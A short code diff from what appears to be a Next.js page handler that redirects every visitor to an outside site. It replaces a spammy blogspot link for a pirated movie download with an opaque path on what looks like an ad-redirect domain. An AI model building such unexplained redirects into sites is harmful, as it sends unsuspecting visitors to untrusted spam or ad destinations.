@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://googletrends996.blogspot.com/2023/12/salaar-new-movie-2024-download-salaar.html/`
+					`https://psockapa.net/4/6815048/`
 				}`,
 			},
 		};
